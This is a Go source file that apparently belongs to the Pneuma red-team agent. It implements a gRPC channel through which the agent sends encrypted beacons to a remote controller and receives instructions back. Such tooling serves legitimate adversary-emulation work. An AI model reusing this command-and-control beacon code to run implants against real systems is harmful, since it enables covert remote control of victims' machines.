package sockets

import (
	"context"
	"encoding/json"
	"github.com/preludeorg/pneuma/channels"
	beacon2 "github.com/preludeorg/pneuma/sockets/protos/beacon"
	"github.com/preludeorg/pneuma/util"
	"time"

	"google.golang.org/grpc"
)

type GRPC struct{}

func init() {
	util.CommunicationChannels["grpc"] = GRPC{}
}

func (contact GRPC) Communicate(agent *util.AgentConfig, name string) (*util.Connection, error) {
	// Create the Envelope Send/Recv channels.
	send := make(chan *util.Envelope)
	recv := make(chan *util.Envelope)
	ctrl := make(chan bool)

	// Create the Connection to be returned to the caller.
	connection := &util.Connection{
		Name:   name,
		Type:   "tcp",
		Send:   send,
		Recv:   recv,
		Ctrl:   ctrl,
		IsOpen: true,
		Cleanup: func() {
			util.DebugLogf("[grpc] cleaning up connection.")
			close(send)
			//conn.Close()
			close(recv)
		},
	}

	go func() {
		defer connection.Cleanup()
		for {
			envelope := <-send
			body := beaconSend(agent.Contact["grpc"], *envelope.Beacon)
			var beacon *util.Beacon
			if err := json.Unmarshal(body, &beacon); err != nil || len(beacon.Links) == 0 {
				continue
			}

			response := util.BuildEnvelope(beacon, connection)
			recv <- response
		}
	}()

	go func() {
		defer connection.Cleanup()
		for {
			env := <-recv
			channels.Envelopes <- env
		}
	}()

	return connection, nil
}

func beaconSend(address string, beacon util.Beacon) []byte {
	conn, err := grpc.Dial(address, grpc.WithInsecure())
	if err != nil {
		util.DebugLogf("[-] %s is either unavailable or a firewall is blocking traffic.", address)
	}
	defer conn.Close()
	c := beacon2.NewBeaconClient(conn)

	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
	defer cancel()

	data, _ := json.Marshal(beacon)
	r, err := c.Handle(ctx, &beacon2.BeaconIncoming{Beacon: string(util.Encrypt(data))})
	if err != nil {
		return nil //no instructions for me
	}
	return []byte(util.Decrypt(r.GetBeacon()))
}
